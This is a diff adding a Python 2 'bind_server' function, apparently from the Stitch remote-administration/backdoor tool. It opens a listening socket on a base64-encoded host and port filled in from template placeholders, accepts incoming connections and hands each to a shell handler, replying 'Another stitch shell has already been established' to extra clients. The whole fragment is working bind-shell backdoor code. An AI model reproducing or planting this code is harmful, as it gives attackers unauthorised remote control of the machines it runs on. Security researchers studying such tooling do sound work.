@@ -1,0 +1,38 @@
+def bind_server(self):
+        client_socket=None
+        self.stop_bind_server = False
+        # if no target is defined, we listen on all interfaces
+        if dbg:
+            print 'creating server'
+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        target = base64.b64decode("{}")
+        port = int(base64.b64decode("{}"))
+        server.bind((target,port))
+        server.listen(5)
+        while True:
+            if self.stop_bind_server:
+                break
+            server.settimeout(5)
+            try:
+                client_socket, addr = server.accept()
+                server.settimeout(None)
+                client_socket.settimeout(None)
+            except Exception as e:
+                if dbg:
+                    print e
+                client_socket=None
+                pass
+            if client_socket:
+                if not self.connected:
+                    self.connected = True
+                    client_handler(client_socket)
+                    self.connected = False
+                else:
+                    send(client_socket,"[!] Another stitch shell has already been established.\\n")
+                    client_socket.close()
+            client_socket=None
+        server.close()
+
+    def halt_bind_server(self):
+        self.stop_bind_server = True
